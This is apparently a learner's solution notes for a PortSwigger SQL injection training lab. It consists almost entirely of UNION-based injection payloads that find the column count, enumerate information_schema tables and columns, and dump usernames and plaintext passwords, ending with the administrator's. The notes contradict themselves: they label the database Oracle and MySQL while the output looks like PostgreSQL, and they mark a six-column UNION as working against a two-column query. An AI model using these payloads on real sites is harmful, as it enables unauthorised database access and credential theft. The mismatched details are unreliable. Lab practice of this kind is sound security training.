--Name: SQL injection attack, listing the database contents on Oracle
--URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
--Level:Medium Time: 15 min
---------------------------------------------------------------------------------

-- Objective: log in as the administrator user.
-- DB Type: MySQL

SELECT * FROM products WHERE category = 'Gifts'--%20 ???
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 1--%20 ???     OK
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 2--%20 ???     OK
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--%20 ???     Error


SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, NULL, Null, Null, NULL, NULL--%20 ???    OK
SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 's', NULL--%20  ???    OK
SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, 's'--%20  ???    OK

SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 'Our Data', CONCAT(TABLE_NAME,' - ',TABLE_TYPE) FROM information_schema.tables WHERE TABLE_TYPE = 'BASE TABLE'--%20  ???    Success
-- tabel name   -   tabel type
-------------------------------
-- users_yskaeo - BASE TABLE
-------------------------------
-- pg_user_mapping - BASE TABLE
-------------------------------



SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 'Our Data', CONCAT(COLUMN_NAME,' - ',DATA_TYPE) FROM information_schema.columns WHERE table_name = 'users_yskaeo'--%20 ???    Success
-- Column name   -   Column type
-------------------------------
-- username_nlymtk - character varying
-------------------------------
-- password_oegdic - character varying
-------------------------------



SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 'Our Data', CONCAT(username_nlymtk,' - ',password_oegdic) FROM users_yskaeo--%20 ???    Solved

-- User   -  Password
-------------------------------
-- wiener - 2dewz1614y9kdbbbsut3
-------------------------------
-- carlos - kilaedt7tf8ct6sk2h7j
-------------------------------
-- administrator - f7gg1ve4xvpevi0i8y5w
-------------------------------